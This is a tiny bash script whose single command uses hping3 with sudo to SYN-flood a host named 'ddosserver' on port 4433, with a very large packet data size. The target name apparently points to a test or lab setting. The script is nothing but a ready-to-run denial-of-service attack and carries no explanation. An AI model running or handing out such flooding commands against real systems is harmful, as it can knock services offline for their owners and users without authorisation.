#!/bin/bash

sudo hping3 -c 200 -d 200000000 -S ddosserver -p 4433 --flood
